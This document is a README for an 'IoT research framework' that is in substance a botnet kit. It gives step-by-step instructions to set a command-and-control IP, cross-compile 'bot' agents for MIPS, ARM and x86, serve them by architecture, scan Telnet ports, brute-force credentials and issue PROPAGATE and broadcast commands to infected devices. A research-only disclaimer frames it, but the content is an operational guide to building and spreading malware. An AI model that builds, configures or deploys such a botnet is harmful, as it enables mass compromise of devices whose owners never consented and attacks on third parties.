# Joker IoT Framework

> **DISCONTINUED PROJECT**: Experimental and may fail at any point. Use at your own risk. No support provided.

An IoT device research framework for studying device security, network reconnaissance, and distributed system architectures. For security researchers and educators only.

---

## Quick Start: Configure & Compile

### 1. Set Your Server IP and Port

All IP addresses are set to `YOUR_C2_IP` placeholder by default. You must replace them before compiling.

**Edit `src/config.json`:**
```json
{
    "listen_host": "0.0.0.0",
    "listen_port": 6667,
    "public_host": "YOUR_SERVER_PUBLIC_IP",
    "public_port": 9001,
    "agent_c2_port": 9001,
    "scan_listen_port": 9002
}
```

Replace `YOUR_SERVER_PUBLIC_IP` with your actual public IP address.

**Update agent source files** (for compiled binaries):
- `core/bot/agent.c` → Change `DEFAULT_C2_HOST`
- `core/bot/agent.go` → Change `DEFAULT_C2_HOST`
- `tools/scanner/fast_scanner.go` → Change `c2Host`

Or use environment variables when running deployment tools:
```bash
python tools/deployer/deployer.py --host YOUR_C2_IP --port 9001
```

### 2. Build Agent Binaries

**C agents** (from WSL2/Ubuntu):
```bash
cd core/bot
mipsel-linux-gnu-gcc -Os -s -static -o bot-mipsle agent.c -lpthread
mips-linux-gnu-gcc -Os -s -static -o bot-mips agent.c -lpthread
arm-linux-gnueabihf-gcc -Os -s -static -o bot-arm agent.c -lpthread
aarch64-linux-gnu-gcc -Os -s -static -o bot-arm64 agent.c -lpthread
```

**Go agents**:
```bash
cd core/bot
export CGO_ENABLED=0
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o bot-amd64 .
GOOS=linux GOARCH=386 go build -ldflags "-s -w" -o bot-386 .
```

**Scanner**:
```bash
cd tools/scanner
GOOS=linux GOARCH=amd64 go build -o fast_scanner .
```

### 3. Start the Server
```bash
python main.py
```

---

## Project Structure

```
.
├── main.py                          # Entry point: Server + console
├── src/
│   └── config.json                  # Network configuration
├── requirements.txt                 # Python dependencies
├── README.md                        # This file
├── AGENTS.md                        # Build instructions
├── core/
│   ├── bot/                         # Device source code
│   │   ├── agent.c                  # C device (MIPS/ARM)
│   │   ├── agent.go                 # Go device (x86_64/386)
│   │   ├── build-*.bat              # Windows build scripts
│   │   └── go.mod
│   └── iot_agent/
│       ├── server.py                # Server: JSON protocol + HTTP
│       ├── agents.json              # Connected devices
│       └── explosives.py
└── tools/
    ├── scanner/                     # Port scanner (Go)
    ├── bruteforcer/                 # Credential tester
    └── deployer/                    # Deployment tool
```

## Network Ports

| Port | Purpose |
|------|---------|
| 9001 TCP | Device connections + HTTP downloads |
| 6667 TCP | Console interface |
| 23 TCP | Scanning target |
| 2323 TCP | Backup port |

## Binary Serving

The server serves device binaries at `http://<host>:9001/agent/<arch>`:

| Request arch | File served |
|-------------|-------------|
| `mipsle` | `bot-mipsle` |
| `mips` | `bot-mips` |
| `arm` | `bot-arm` |
| `arm64` | `bot-arm64` |
| `x86` | `bot-386` |
| `x86_64` | `bot-amd64` |

## Console Commands

| Command | Description |
|---------|-------------|
| `BOTS` | List all connected devices |
| `STATUS` | Show server status |
| `PROPAGATE [threads]` | Start scanning with devices |
| `STOP` | Stop all scanning |
| `<cmd> ALL` | Broadcast command |
| `<cmd> <id>` | Send command to specific device |

## Security Notice

For authorized security research and educational purposes only. Only use on systems you own or have explicit permission to test.

## Tutorial

Setup and usage tutorials:
https://www.youtube.com/@kydn-iu5kd